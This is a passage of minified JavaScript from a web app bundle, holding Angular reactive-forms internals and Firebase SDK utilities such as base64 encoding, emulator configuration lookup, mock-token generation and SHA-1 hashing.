zN(t,e){return[...e.path,t]}function P_(t,e,n=Dh){bh(t,e),e.valueAccessor.writeValue(t.value),(t.disabled||n==="always")&&e.valueAccessor.setDisabledState?.(t.disabled),qN(t,e),KN(t,e),YN(t,e),GN(t,e)}function k_(t,e,n=!0){let r=()=>{};e.valueAccessor&&(e.valueAccessor.registerOnChange(r),e.valueAccessor.registerOnTouched(r)),mc(t,e),t&&(e._invokeOnDestroyCallbacks(),t._registerOnCollectionChange(()=>{}))}function gc(t,e){t.forEach(n=>{n.registerOnValidatorChange&&n.registerOnValidatorChange(e)})}function GN(t,e){if(e.valueAccessor.setDisabledState){let n=r=>{e.valueAccessor.setDisabledState(r)};t.registerOnDisabledChange(n),e._registerOnDestroy(()=>{t._unregisterOnDisabledChange(n)})}}function bh(t,e){let n=eI(t);e.validator!==null?t.setValidators(R_(n,e.validator)):typeof n=="function"&&t.setValidators([n]);let r=tI(t);e.asyncValidator!==null?t.setAsyncValidators(R_(r,e.asyncValidator)):typeof r=="function"&&t.setAsyncValidators([r]);let i=()=>t.updateValueAndValidity();gc(e._rawValidators,i),gc(e._rawAsyncValidators,i)}function mc(t,e){let n=!1;if(t!==null){if(e.validator!==null){let i=eI(t);if(Array.isArray(i)&&i.length>0){let o=i.filter(s=>s!==e.validator);o.length!==i.length&&(n=!0,t.setValidators(o))}}if(e.asyncValidator!==null){let i=tI(t);if(Array.isArray(i)&&i.length>0){let o=i.filter(s=>s!==e.asyncValidator);o.length!==i.length&&(n=!0,t.setAsyncValidators(o))}}}let r=()=>{};return gc(e._rawValidators,r),gc(e._rawAsyncValidators,r),n}function qN(t,e){e.valueAccessor.registerOnChange(n=>{t._pendingValue=n,t._pendingChange=!0,t._pendingDirty=!0,t.updateOn==="change"&&aI(t,e)})}function YN(t,e){e.valueAccessor.registerOnTouched(()=>{t._pendingTouched=!0,t.updateOn==="blur"&&t._pendingChange&&aI(t,e),t.updateOn!=="submit"&&t.markAsTouched()})}function aI(t,e){t._pendingDirty&&t.markAsDirty(),t.setValue(t._pendingValue,{emitModelToViewChange:!1}),e.viewToModelUpdate(t._pendingValue),t._pendingChange=!1}function KN(t,e){let n=(r,i)=>{e.valueAccessor.writeValue(r),i&&e.viewToModelUpdate(r)};t.registerOnChange(n),e._registerOnDestroy(()=>{t._unregisterOnChange(n)})}function ZN(t,e){t==null,bh(t,e)}function QN(t,e){return mc(t,e)}function JN(t,e){if(!t.hasOwnProperty("model"))return!1;let n=t.model;return n.isFirstChange()?!0:!Object.is(e,n.currentValue)}function XN(t){return Object.getPrototypeOf(t.constructor)===wh}function eR(t,e){t._syncPendingControls(),e.forEach(n=>{let r=n.control;r.updateOn==="submit"&&r._pendingChange&&(n.viewToModelUpdate(r._pendingValue),r._pendingChange=!1)})}function tR(t,e){if(!e)return null;Array.isArray(e);let n,r,i;return e.forEach(o=>{o.constructor===yc?n=o:XN(o)?r=o:i=o}),i||r||n||null}function nR(t,e){let n=t.indexOf(e);n>-1&&t.splice(n,1)}function F_(t,e){let n=t.indexOf(e);n>-1&&t.splice(n,1)}function L_(t){return typeof t=="object"&&t!==null&&Object.keys(t).length===2&&"value"in t&&"disabled"in t}var lc=class extends pi{constructor(e=null,n,r){super(Eh(n),Ch(r,n)),this.defaultValue=null,this._onChange=[],this._pendingChange=!1,this._applyFormState(e),this._setUpdateStrategy(n),this._initObservables(),this.updateValueAndValidity({onlySelf:!0,emitEvent:!!this.asyncValidator}),_c(n)&&(n.nonNullable||n.initialValueIsDefault)&&(L_(e)?this.defaultValue=e.value:this.defaultValue=e)}setValue(e,n={}){this.value=this._pendingValue=e,this._onChange.length&&n.emitModelToViewChange!==!1&&this._onChange.forEach(r=>r(this.value,n.emitViewToModelChange!==!1)),this.updateValueAndValidity(n)}patchValue(e,n={}){this.setValue(e,n)}reset(e=this.defaultValue,n={}){this._applyFormState(e),this.markAsPristine(n),this.markAsUntouched(n),this.setValue(this.value,n),this._pendingChange=!1}_updateValue(){}_anyControls(e){return!1}_allControlsDisabled(){return this.disabled}registerOnChange(e){this._onChange.push(e)}_unregisterOnChange(e){F_(this._onChange,e)}registerOnDisabledChange(e){this._onDisabledChange.push(e)}_unregisterOnDisabledChange(e){F_(this._onDisabledChange,e)}_forEachChild(e){}_syncPendingControls(){return this.updateOn==="submit"&&(this._pendingDirty&&this.markAsDirty(),this._pendingTouched&&this.markAsTouched(),this._pendingChange)?(this.setValue(this._pendingValue,{onlySelf:!0,emitModelToViewChange:!1}),!0):!1}_applyFormState(e){L_(e)?(this.value=this._pendingValue=e.value,e.disabled?this.disable({onlySelf:!0,emitEvent:!1}):this.enable({onlySelf:!0,emitEvent:!1})):this.value=this._pendingValue=e}};var rR=t=>t instanceof lc;var cI=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275dir=Ie({type:t,selectors:[["form",3,"ngNoForm","",3,"ngNativeValidate",""]],hostAttrs:["novalidate",""]})}}return t})();var lI=new I("");var iR={provide:fi,useExisting:un(()=>Sh)},Sh=(()=>{class t extends fi{get submitted(){return Lt(this._submittedReactive)}set submitted(n){this._submittedReactive.set(n)}constructor(n,r,i){super(),this.callSetDisabledState=i,this._submitted=so(()=>this._submittedReactive()),this._submittedReactive=oo(!1),this._onCollectionChange=()=>this._updateDomValue(),this.directives=[],this.form=null,this.ngSubmit=new se,this._setValidators(n),this._setAsyncValidators(r)}ngOnChanges(n){this._checkFormPresent(),n.hasOwnProperty("form")&&(this._updateValidators(),this._updateDomValue(),this._updateRegistrations(),this._oldForm=this.form)}ngOnDestroy(){this.form&&(mc(this.form,this),this.form._onCollectionChange===this._onCollectionChange&&this.form._registerOnCollectionChange(()=>{}))}get formDirective(){return this}get control(){return this.form}get path(){return[]}addControl(n){let r=this.form.get(n.path);return P_(r,n,this.callSetDisabledState),r.updateValueAndValidity({emitEvent:!1}),this.directives.push(n),r}getControl(n){return this.form.get(n.path)}removeControl(n){k_(n.control||null,n,!1),nR(this.directives,n)}addFormGroup(n){this._setUpFormContainer(n)}removeFormGroup(n){this._cleanUpFormContainer(n)}getFormGroup(n){return this.form.get(n.path)}addFormArray(n){this._setUpFormContainer(n)}removeFormArray(n){this._cleanUpFormContainer(n)}getFormArray(n){return this.form.get(n.path)}updateModel(n,r){this.form.get(n.path).setValue(r)}onSubmit(n){return this._submittedReactive.set(!0),eR(this.form,this.directives),this.ngSubmit.emit(n),this.form._events.next(new vh(this.control)),n?.target?.method==="dialog"}onReset(){this.resetForm()}resetForm(n=void 0){this.form.reset(n),this._submittedReactive.set(!1),this.form._events.next(new yh(this.form))}_updateDomValue(){this.directives.forEach(n=>{let r=n.control,i=this.form.get(n.path);r!==i&&(k_(r||null,n),rR(i)&&(P_(i,n,this.callSetDisabledState),n.control=i))}),this.form._updateTreeValidity({emitEvent:!1})}_setUpFormContainer(n){let r=this.form.get(n.path);ZN(r,n),r.updateValueAndValidity({emitEvent:!1})}_cleanUpFormContainer(n){if(this.form){let r=this.form.get(n.path);r&&QN(r,n)&&r.updateValueAndValidity({emitEvent:!1})}}_updateRegistrations(){this.form._registerOnCollectionChange(this._onCollectionChange),this._oldForm&&this._oldForm._registerOnCollectionChange(()=>{})}_updateValidators(){bh(this.form,this),this._oldForm&&mc(this._oldForm,this)}_checkFormPresent(){this.form}static{this.\u0275fac=function(r){return new(r||t)(W($_,10),W(H_,10),W(sI,8))}}static{this.\u0275dir=Ie({type:t,selectors:[["","formGroup",""]],hostBindings:function(r,i){r&1&&Ft("submit",function(s){return i.onSubmit(s)})("reset",function(){return i.onReset()})},inputs:{form:[0,"formGroup","form"]},outputs:{ngSubmit:"ngSubmit"},exportAs:["ngForm"],features:[Qr([iR]),mt,Hn]})}}return t})();var oR={provide:ko,useExisting:un(()=>Th)},Th=(()=>{class t extends ko{set isDisabled(n){}static{this._ngModelWarningSentOnce=!1}constructor(n,r,i,o,s){super(),this._ngModelWarningConfig=s,this._added=!1,this.name=null,this.update=new se,this._ngModelWarningSent=!1,this._parent=n,this._setValidators(r),this._setAsyncValidators(i),this.valueAccessor=tR(this,o)}ngOnChanges(n){this._added||this._setUpControl(),JN(n,this.viewModel)&&(this.viewModel=this.model,this.formDirective.updateModel(this,this.model))}ngOnDestroy(){this.formDirective&&this.formDirective.removeControl(this)}viewToModelUpdate(n){this.viewModel=n,this.update.emit(n)}get path(){return zN(this.name==null?this.name:this.name.toString(),this._parent)}get formDirective(){return this._parent?this._parent.formDirective:null}_checkParentType(){}_setUpControl(){this._checkParentType(),this.control=this.formDirective.addControl(this),this._added=!0}static{this.\u0275fac=function(r){return new(r||t)(W(fi,13),W($_,10),W(H_,10),W(vc,10),W(lI,8))}}static{this.\u0275dir=Ie({type:t,selectors:[["","formControlName",""]],inputs:{name:[0,"formControlName","name"],isDisabled:[0,"disabled","isDisabled"],model:[0,"ngModel","model"]},outputs:{update:"ngModelChange"},features:[Qr([oR]),mt,Hn]})}}return t})(),sR={provide:vc,useExisting:un(()=>dI),multi:!0};function uI(t,e){return t==null?`${e}`:(e&&typeof e=="object"&&(e="Object"),`${t}: ${e}`.slice(0,50))}function aR(t){return t.split(":")[0]}var dI=(()=>{class t extends wh{constructor(){super(...arguments),this._optionMap=new Map,this._idCounter=0,this._compareWith=Object.is}set compareWith(n){this._compareWith=n}writeValue(n){this.value=n;let r=this._getOptionId(n),i=uI(r,n);this.setProperty("value",i)}registerOnChange(n){this.onChange=r=>{this.value=this._getOptionValue(r),n(this.value)}}_registerOption(){return(this._idCounter++).toString()}_getOptionId(n){for(let r of this._optionMap.keys())if(this._compareWith(this._optionMap.get(r),n))return r;return null}_getOptionValue(n){let r=aR(n);return this._optionMap.has(r)?this._optionMap.get(r):n}static{this.\u0275fac=(()=>{let n;return function(i){return(n||(n=Wn(t)))(i||t)}})()}static{this.\u0275dir=Ie({type:t,selectors:[["select","formControlName","",3,"multiple",""],["select","formControl","",3,"multiple",""],["select","ngModel","",3,"multiple",""]],hostBindings:function(r,i){r&1&&Ft("change",function(s){return i.onChange(s.target.value)})("blur",function(){return i.onTouched()})},inputs:{compareWith:"compareWith"},features:[Qr([sR]),mt]})}}return t})(),hI=(()=>{class t{constructor(n,r,i){this._element=n,this._renderer=r,this._select=i,this._select&&(this.id=this._select._registerOption())}set ngValue(n){this._select!=null&&(this._select._optionMap.set(this.id,n),this._setElementValue(uI(this.id,n)),this._select.writeValue(this._select.value))}set value(n){this._setElementValue(n),this._select&&this._select.writeValue(this._select.value)}_setElementValue(n){this._renderer.setProperty(this._element.nativeElement,"value",n)}ngOnDestroy(){this._select&&(this._select._optionMap.delete(this.id),this._select.writeValue(this._select.value))}static{this.\u0275fac=function(r){return new(r||t)(W(kt),W(fn),W(dI,9))}}static{this.\u0275dir=Ie({type:t,selectors:[["option"]],inputs:{ngValue:"ngValue",value:"value"}})}}return t})(),cR={provide:vc,useExisting:un(()=>fI),multi:!0};function V_(t,e){return t==null?`${e}`:(typeof e=="string"&&(e=`'${e}'`),e&&typeof e=="object"&&(e="Object"),`${t}: ${e}`.slice(0,50))}function lR(t){return t.split(":")[0]}var fI=(()=>{class t extends wh{constructor(){super(...arguments),this._optionMap=new Map,this._idCounter=0,this._compareWith=Object.is}set compareWith(n){this._compareWith=n}writeValue(n){this.value=n;let r;if(Array.isArray(n)){let i=n.map(o=>this._getOptionId(o));r=(o,s)=>{o._setSelected(i.indexOf(s.toString())>-1)}}else r=(i,o)=>{i._setSelected(!1)};this._optionMap.forEach(r)}registerOnChange(n){this.onChange=r=>{let i=[],o=r.selectedOptions;if(o!==void 0){let s=o;for(let a=0;a<s.length;a++){let c=s[a],l=this._getOptionValue(c.value);i.push(l)}}else{let s=r.options;for(let a=0;a<s.length;a++){let c=s[a];if(c.selected){let l=this._getOptionValue(c.value);i.push(l)}}}this.value=i,n(i)}}_registerOption(n){let r=(this._idCounter++).toString();return this._optionMap.set(r,n),r}_getOptionId(n){for(let r of this._optionMap.keys())if(this._compareWith(this._optionMap.get(r)._value,n))return r;return null}_getOptionValue(n){let r=lR(n);return this._optionMap.has(r)?this._optionMap.get(r)._value:n}static{this.\u0275fac=(()=>{let n;return function(i){return(n||(n=Wn(t)))(i||t)}})()}static{this.\u0275dir=Ie({type:t,selectors:[["select","multiple","","formControlName",""],["select","multiple","","formControl",""],["select","multiple","","ngModel",""]],hostBindings:function(r,i){r&1&&Ft("change",function(s){return i.onChange(s.target)})("blur",function(){return i.onTouched()})},inputs:{compareWith:"compareWith"},features:[Qr([cR]),mt]})}}return t})(),pI=(()=>{class t{constructor(n,r,i){this._element=n,this._renderer=r,this._select=i,this._select&&(this.id=this._select._registerOption(this))}set ngValue(n){this._select!=null&&(this._value=n,this._setElementValue(V_(this.id,n)),this._select.writeValue(this._select.value))}set value(n){this._select?(this._value=n,this._setElementValue(V_(this.id,n)),this._select.writeValue(this._select.value)):this._setElementValue(n)}_setElementValue(n){this._renderer.setProperty(this._element.nativeElement,"value",n)}_setSelected(n){this._renderer.setProperty(this._element.nativeElement,"selected",n)}ngOnDestroy(){this._select&&(this._select._optionMap.delete(this.id),this._select.writeValue(this._select.value))}static{this.\u0275fac=function(r){return new(r||t)(W(kt),W(fn),W(fI,9))}}static{this.\u0275dir=Ie({type:t,selectors:[["option"]],inputs:{ngValue:"ngValue",value:"value"}})}}return t})();var uR=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275mod=$n({type:t})}static{this.\u0275inj=Bn({})}}return t})(),Ih=class extends pi{constructor(e,n,r){super(Eh(n),Ch(r,n)),this.controls=e,this._initObservables(),this._setUpdateStrategy(n),this._setUpControls(),this.updateValueAndValidity({onlySelf:!0,emitEvent:!!this.asyncValidator})}at(e){return this.controls[this._adjustIndex(e)]}push(e,n={}){this.controls.push(e),this._registerControl(e),this.updateValueAndValidity({emitEvent:n.emitEvent}),this._onCollectionChange()}insert(e,n,r={}){this.controls.splice(e,0,n),this._registerControl(n),this.updateValueAndValidity({emitEvent:r.emitEvent})}removeAt(e,n={}){let r=this._adjustIndex(e);r<0&&(r=0),this.controls[r]&&this.controls[r]._registerOnCollectionChange(()=>{}),this.controls.splice(r,1),this.updateValueAndValidity({emitEvent:n.emitEvent})}setControl(e,n,r={}){let i=this._adjustIndex(e);i<0&&(i=0),this.controls[i]&&this.controls[i]._registerOnCollectionChange(()=>{}),this.controls.splice(i,1),n&&(this.controls.splice(i,0,n),this._registerControl(n)),this.updateValueAndValidity({emitEvent:r.emitEvent}),this._onCollectionChange()}get length(){return this.controls.length}setValue(e,n={}){oI(this,!1,e),e.forEach((r,i)=>{iI(this,!1,i),this.at(i).setValue(r,{onlySelf:!0,emitEvent:n.emitEvent})}),this.updateValueAndValidity(n)}patchValue(e,n={}){e!=null&&(e.forEach((r,i)=>{this.at(i)&&this.at(i).patchValue(r,{onlySelf:!0,emitEvent:n.emitEvent})}),this.updateValueAndValidity(n))}reset(e=[],n={}){this._forEachChild((r,i)=>{r.reset(e[i],{onlySelf:!0,emitEvent:n.emitEvent})}),this._updatePristine(n,this),this._updateTouched(n,this),this.updateValueAndValidity(n)}getRawValue(){return this.controls.map(e=>e.getRawValue())}clear(e={}){this.controls.length<1||(this._forEachChild(n=>n._registerOnCollectionChange(()=>{})),this.controls.splice(0),this.updateValueAndValidity({emitEvent:e.emitEvent}))}_adjustIndex(e){return e<0?e+this.length:e}_syncPendingControls(){let e=this.controls.reduce((n,r)=>r._syncPendingControls()?!0:n,!1);return e&&this.updateValueAndValidity({onlySelf:!0}),e}_forEachChild(e){this.controls.forEach((n,r)=>{e(n,r)})}_updateValue(){this.value=this.controls.filter(e=>e.enabled||this.disabled).map(e=>e.value)}_anyControls(e){return this.controls.some(n=>n.enabled&&e(n))}_setUpControls(){this._forEachChild(e=>this._registerControl(e))}_allControlsDisabled(){for(let e of this.controls)if(e.enabled)return!1;return this.controls.length>0||this.disabled}_registerControl(e){e.setParent(this),e._registerOnCollectionChange(this._onCollectionChange)}_find(e){return this.at(e)??null}};function j_(t){return!!t&&(t.asyncValidators!==void 0||t.validators!==void 0||t.updateOn!==void 0)}var gI=(()=>{class t{constructor(){this.useNonNullable=!1}get nonNullable(){let n=new t;return n.useNonNullable=!0,n}group(n,r=null){let i=this._reduceControls(n),o={};return j_(r)?o=r:r!==null&&(o.validators=r.validator,o.asyncValidators=r.asyncValidator),new pc(i,o)}record(n,r=null){let i=this._reduceControls(n);return new _h(i,r)}control(n,r,i){let o={};return this.useNonNullable?(j_(r)?o=r:(o.validators=r,o.asyncValidators=i),new lc(n,x(v({},o),{nonNullable:!0}))):new lc(n,r,i)}array(n,r,i){let o=n.map(s=>this._createControl(s));return new Ih(o,r,i)}_reduceControls(n){let r={};return Object.keys(n).forEach(i=>{r[i]=this._createControl(n[i])}),r}_createControl(n){if(n instanceof lc)return n;if(n instanceof pi)return n;if(Array.isArray(n)){let r=n[0],i=n.length>1?n[1]:null,o=n.length>2?n[2]:null;return this.control(r,i,o)}else return this.control(n)}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();var Ic=(()=>{class t{static withConfig(n){return{ngModule:t,providers:[{provide:lI,useValue:n.warnOnNgModelWithFormControl??"always"},{provide:sI,useValue:n.callSetDisabledState??Dh}]}}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275mod=$n({type:t})}static{this.\u0275inj=Bn({imports:[uR]})}}return t})();var Mh={NODE_CLIENT:!1,NODE_ADMIN:!1,SDK_VERSION:"${JSCORE_VERSION}"};var m=function(t,e){if(!t)throw Jn(e)},Jn=function(t){return new Error("Firebase Database ("+Mh.SDK_VERSION+") INTERNAL ASSERT FAILED: "+t)};var vI=function(t){let e=[],n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):(i&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(i=65536+((i&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},hR=function(t){let e=[],n=0,r=0;for(;n<t.length;){let i=t[n++];if(i<128)e[r++]=String.fromCharCode(i);else if(i>191&&i<224){let o=t[n++];e[r++]=String.fromCharCode((i&31)<<6|o&63)}else if(i>239&&i<365){let o=t[n++],s=t[n++],a=t[n++],c=((i&7)<<18|(o&63)<<12|(s&63)<<6|a&63)-65536;e[r++]=String.fromCharCode(55296+(c>>10)),e[r++]=String.fromCharCode(56320+(c&1023))}else{let o=t[n++],s=t[n++];e[r++]=String.fromCharCode((i&15)<<12|(o&63)<<6|s&63)}}return e.join("")},Ec={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();let n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let i=0;i<t.length;i+=3){let o=t[i],s=i+1<t.length,a=s?t[i+1]:0,c=i+2<t.length,l=c?t[i+2]:0,u=o>>2,d=(o&3)<<4|a>>4,h=(a&15)<<2|l>>6,f=l&63;c||(f=64,s||(h=64)),r.push(n[u],n[d],n[h],n[f])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(vI(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):hR(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();let n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let i=0;i<t.length;){let o=n[t.charAt(i++)],a=i<t.length?n[t.charAt(i)]:0;++i;let l=i<t.length?n[t.charAt(i)]:64;++i;let d=i<t.length?n[t.charAt(i)]:64;if(++i,o==null||a==null||l==null||d==null)throw new Nh;let h=o<<2|a>>4;if(r.push(h),l!==64){let f=a<<4&240|l>>2;if(r.push(f),d!==64){let g=l<<6&192|d;r.push(g)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}},Nh=class extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}},xh=function(t){let e=vI(t);return Ec.encodeByteArray(e,!0)},Fo=function(t){return xh(t).replace(/\./g,"")},Lo=function(t){try{return Ec.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};function yI(t){return _I(void 0,t)}function _I(t,e){if(!(e instanceof Object))return e;switch(e.constructor){case Date:let n=e;return new Date(n.getTime());case Object:t===void 0&&(t={});break;case Array:t=[];break;default:return e}for(let n in e)!e.hasOwnProperty(n)||!fR(n)||(t[n]=_I(t[n],e[n]));return t}function fR(t){return t!=="__proto__"}function pR(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}var gR=()=>pR().__FIREBASE_DEFAULTS__,mR=()=>{if(typeof process>"u"||typeof process.env>"u")return;let t=process.env.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},vR=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}let e=t&&Lo(t[1]);return e&&JSON.parse(e)},Oh=()=>{try{return gR()||mR()||vR()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},Ph=t=>{var e,n;return(n=(e=Oh())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},II=t=>{let e=Ph(t);if(!e)return;let n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);let r=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),r]:[e.substring(0,n),r]},kh=()=>{var t;return(t=Oh())===null||t===void 0?void 0:t.config},Fh=t=>{var e;return(e=Oh())===null||e===void 0?void 0:e[`_${t}`]};var yn=class{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,r)=>{n?this.reject(n):this.resolve(r),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,r))}}};function wI(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');let n={alg:"none",type:"JWT"},r=e||"demo-project",i=t.iat||0,o=t.sub||t.user_id;if(!o)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");let s=Object.assign({iss:`https://securetoken.google.com/${r}`,aud:r,iat:i,exp:i+3600,auth_time:i,sub:o,user_id:o,firebase:{sign_in_provider:"custom",identities:{}}},t);return[Fo(JSON.stringify(n)),Fo(JSON.stringify(s)),""].join(".")}function we(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function Vo(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(we())}function EI(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function CI(){let t=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof t=="object"&&t.id!==void 0}function Cc(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function DI(){let t=we();return t.indexOf("MSIE ")>=0||t.indexOf("Trident/")>=0}function yt(){return Mh.NODE_CLIENT===!0||Mh.NODE_ADMIN===!0}function bI(){try{return typeof indexedDB=="object"}catch{return!1}}function SI(){return new Promise((t,e)=>{try{let n=!0,r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),t(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{var o;e(((o=i.error)===null||o===void 0?void 0:o.message)||"")}}catch(n){e(n)}})}var yR="FirebaseError",ot=class t extends Error{constructor(e,n,r){super(n),this.code=e,this.customData=r,this.name=yR,Object.setPrototypeOf(this,t.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,Bt.prototype.create)}},Bt=class{constructor(e,n,r){this.service=e,this.serviceName=n,this.errors=r}create(e,...n){let r=n[0]||{},i=`${this.service}/${e}`,o=this.errors[e],s=o?_R(o,r):"Error",a=`${this.serviceName}: ${s} (${i}).`;return new ot(i,a,r)}};function _R(t,e){return t.replace(IR,(n,r)=>{let i=e[r];return i!=null?String(i):`<${r}?>`})}var IR=/\{\$([^}]+)}/g;function gi(t){return JSON.parse(t)}function he(t){return JSON.stringify(t)}var TI=function(t){let e={},n={},r={},i="";try{let o=t.split(".");e=gi(Lo(o[0])||""),n=gi(Lo(o[1])||""),i=o[2],r=n.d||{},delete n.d}catch{}return{header:e,claims:n,data:r,signature:i}};var AI=function(t){let e=TI(t),n=e.claims;return!!n&&typeof n=="object"&&n.hasOwnProperty("iat")},MI=function(t){let e=TI(t).claims;return typeof e=="object"&&e.admin===!0};function _t(t,e){return Object.prototype.hasOwnProperty.call(t,e)}function Xn(t,e){if(Object.prototype.hasOwnProperty.call(t,e))return t[e]}function jo(t){for(let e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function Uo(t,e,n){let r={};for(let i in t)Object.prototype.hasOwnProperty.call(t,i)&&(r[i]=e.call(n,t[i],i,t));return r}function mi(t,e){if(t===e)return!0;let n=Object.keys(t),r=Object.keys(e);for(let i of n){if(!r.includes(i))return!1;let o=t[i],s=e[i];if(mI(o)&&mI(s)){if(!mi(o,s))return!1}else if(o!==s)return!1}for(let i of r)if(!n.includes(i))return!1;return!0}function mI(t){return t!==null&&typeof t=="object"}function er(t){let e=[];for(let[n,r]of Object.entries(t))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}var wc=class{constructor(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=512/8,this.pad_[0]=128;for(let e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}reset(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0}compress_(e,n){n||(n=0);let r=this.W_;if(typeof e=="string")for(let d=0;d<16;d++)r[d]=e.charCodeAt(n)<<24|e.charCodeAt(n+1)<<16|e.charCodeAt(n+2)<<8|e.charCodeAt(n+3),n+=4;else for(let d=0;d<16;d++)r[d]=e[n]<<24|e[n+1]<<16|e[n+2]<<8|e[n+3],n+=4;for(let d=16;d<80;d++){let h=r[d-3]^r[d-8]^r[d-14]^r[d-16];r[d]=(h<<1|h>>>31)&4294967295}let i=this.chain_[0],o=this.chain_[1],s=this.chain_[2],a=this.chain_[3],c=this.chain_[4],l,u;for(let d=0;d<80;d++){d<40?d<20?(l=a^o&(s^a),u=1518500249):(l=o^s^a,u=1859775393):d<60?(l=o&s|a&(o|s),u=2400959708):(l=o^s^a,u=3395469782);let h=(i<<5|i>>>27)+l+c+u+r[d]&4294967295;c=a,a=s,s=(o<<30|o>>>2)&4294967295,o=i,i=h}this.chain_[0]=this.chain_[0]+i&4294967295,this.chain_[1]=this.chain_[1]+o&4294967295,this.chain_[2]=this.chain_[2]+s&4294967295,this.chain_[3]=this.chain_[3]+a&4294967295,this.chain_[4]=this.chain_[4]+c&4294967295}update(e,n){if(e==null)return;n===void 0&&(n=e.length);let r=n-this.blockSize,i=0,o=this.buf_,s=this.inbuf_;for(;i<n;){if(s===0)for(;i<=r;)this.compress_(e,i),i+=this.blockSize;if(typeof e=="string"){for(;i<n;)if(o[s]=e.charCodeAt(i),++s,++i,s===this.blockSize){this.compress_(o),s=0;break}}else for(;i<n;)if(o[s]=e[i],++s,++i,s===this.blockSize){this.compress_(o),s=0;break}}this.inbuf_=s,this.total_+=n}digest(){let e=[],n=this.total_*8;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(let i=this.blockSize-1;i>=56;i--)this.buf_[i]=n&255,n/=256;this.compress_(this.buf_);let r=0;for(let i=0;i<5;i++)for(let o=24;o>=0;o-=8)e[r]=this.chain_[i]>>o&255,++r;return e}};function NI(t,e){let n=new Rh(t,e);return n.subscribe.bind(n)}var 